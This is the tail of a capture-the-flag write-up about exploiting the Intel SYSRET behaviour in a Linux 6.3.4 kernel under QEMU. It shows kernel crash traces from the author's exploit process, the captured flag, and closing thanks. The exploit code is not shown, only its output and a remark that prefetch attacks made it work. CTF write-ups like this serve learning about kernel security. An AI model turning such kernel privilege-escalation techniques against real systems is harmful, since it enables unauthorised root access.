[   93.380438] Modules linked in:
[   93.380625] ---[ end trace 0000000000000000 ]---
[   93.380897] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.381212] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.382302] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.382606] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.383027] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.383444] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.383857] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.384274] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.384689] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.385154] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.385496] CR2: 00007ffc8370b858 CR3: 0000000100ac4004 CR4: 0000000000770ef0
[   93.385915] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.386333] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.386745] PKRU: 55555554
[   93.386907] note: exploit[83] exited with irqs disabled
[   93.387268] general protection fault
[   93.387485] general protection fault, maybe for address 0x56: 0000 [#2] PREEMPT SMP NOPTI
[   93.387958] CPU: 0 PID: 85 Comm: exploit Tainted: G      D            6.3.4 #14
[   93.388394] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.388947] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.389256] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.390325] RSP: 0018:ffffffffb6c3b768 EFLAGS: 00010046
[   93.390633] RAX: 0000000000000056 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.391053] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.391468] RBP: 0000002d00000000 R08: 0000612f706d742f R09: 0000612f706d742f
[   93.391879] R10: 0000612f706d742f R11: 0000000000000246 R12: ffffffffb6c3a320
[   93.392302] R13: ffffffffb7240160 R14: ffff8d9100049600 R15: 0000612f706d742f
[   93.392718] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.393176] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.393515] CR2: 00007ffc83709fe4 CR3: 0000000100ac8005 CR4: 0000000000770ef0
[   93.393932] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.394347] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.394757] PKRU: 55555554
[   93.394919] Call Trace:
[   93.395065] Modules linked in:
[   93.395247] ---[ end trace 0000000000000000 ]---
[   93.395512] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.395824] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.396906] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.397208] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.397619] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.398028] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.398434] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.398840] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.399251] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.399717] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.400051] CR2: 00007ffc83709fe4 CR3: 0000000100ac8005 CR4: 0000000000770ef0
[   93.400469] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.400881] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.401295] PKRU: 55555554
[   93.401457] note: exploit[85] exited with irqs disabled
[   93.402397] ------------[ cut here ]------------
[   93.402683] WARNING: CPU: 0 PID: 30 at kernel/ucount.c:285 dec_rlimit_ucounts+0x4f/0x60
[   93.403149] Modules linked in:
[   93.403341] CPU: 0 PID: 30 Comm: kworker/u2:2 Tainted: G      D            6.3.4 #14
[   93.403797] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.404358] Workqueue: events_unbound call_usermodehelper_exec_work
[   93.404727] RIP: 0010:dec_rlimit_ucounts+0x4f/0x60
[   93.405014] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc <0f> 0b eb da 31 c0 c3 cc cc cc cc 66 0f 1f 44 00 00 90 90 90 90 90
[   93.406089] RSP: 0018:ffffa71340107d00 EFLAGS: 00010297
[   93.406404] RAX: ffffffffffffffff RBX: ffffa71340107e08 RCX: ffffffffb6c3b6c0
[   93.406820] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffffb6c3b6c0
[   93.407240] RBP: ffff8d9100c442c0 R08: ffffffffffffffff R09: ffffffffffffffff
[   93.407651] R10: 00000000000000ba R11: 00000000000009e8 R12: ffffffffb6c3b6c0
[   93.408065] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
[   93.408482] FS:  0000000000000000(0000) GS:ffff8d913bc00000(0000) knlGS:0000000000000000
[   93.408947] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.409288] CR2: 000000000065eff0 CR3: 000000004222c006 CR4: 0000000000770ef0
[   93.409709] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.410125] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.410541] PKRU: 55555554
[   93.410708] Call Trace:
[   93.410862]  <TASK>
[   93.410992]  release_task+0x47/0x4b0
[   93.411217]  ? thread_group_cputime_adjusted+0x46/0x70
[   93.411522]  wait_consider_task+0x90d/0x9e0
[   93.411770]  do_wait+0x17b/0x2c0
[   93.411966]  kernel_wait+0x44/0x90
[   93.412175]  ? __pfx_child_wait_callback+0x10/0x10
[   93.412461]  call_usermodehelper_exec_work+0x72/0x80
[   93.412754]  process_one_work+0x1b1/0x340
[   93.412994]  worker_thread+0x45/0x3b0
[   93.413219]  ? __pfx_worker_thread+0x10/0x10
[   93.413473]  kthread+0xd1/0x100
[   93.413659]  ? __pfx_kthread+0x10/0x10
[   93.413883]  ret_from_fork+0x29/0x50
[   93.414103]  </TASK>
[   93.414238] ---[ end trace 0000000000000000 ]---
/tmp/bad: line 1: : not found
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs manual.}
```

After a few runs the prefetch attacks succeeded and the exploit worked! flag!

## closing

This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug ever since I learned about it. So, thanks to FizzBuzz101 for creating this challenge!

<style>
.caption {
  text-align: center;
  font-size: .8rem !important;
  color: lightgrey;
}
</style>



